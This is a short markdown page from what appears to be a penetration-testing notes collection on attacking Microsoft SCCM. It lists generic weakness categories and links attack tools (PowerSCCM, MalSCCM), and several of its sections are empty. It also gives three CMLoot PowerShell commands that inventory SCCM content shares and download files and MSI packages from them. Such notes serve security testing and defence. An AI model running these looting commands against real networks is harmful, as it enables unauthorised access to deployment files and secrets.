---
description: Microsoft SCCM (System Center Configuration Manager)
---

# 🟠 SCCM

While SCCM is a powerful tool for managing and deploying software in enterprise environments, it is not without its flaws. Here, I will explore five relevant vulnerabilities that could potentially compromise the security of SCCM.&#x20;

By understanding these weaknesses, we can work towards enhancing the overall security of our systems.

* Unauthorized Access through Weak Authentication Mechanisms
* Insecure Communication Channels
* Lack of Patch Management
* Insufficient Privilege Management
* Weak Encryption of Sensitive Data

### Tools to Attack SCCM

* [PowerSCCM](https://github.com/PowerShellMafia/PowerSCCM)
* [MalSCCM](https://github.com/nettitude/MalSCCM)

### SCCM Deployment

### Network Access Accounts

### SCCM Shares

```powershell
Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt
```

{% code overflow="wrap" %}
```powershell
Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml
```
{% endcode %}

```powershell
Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension msi
```
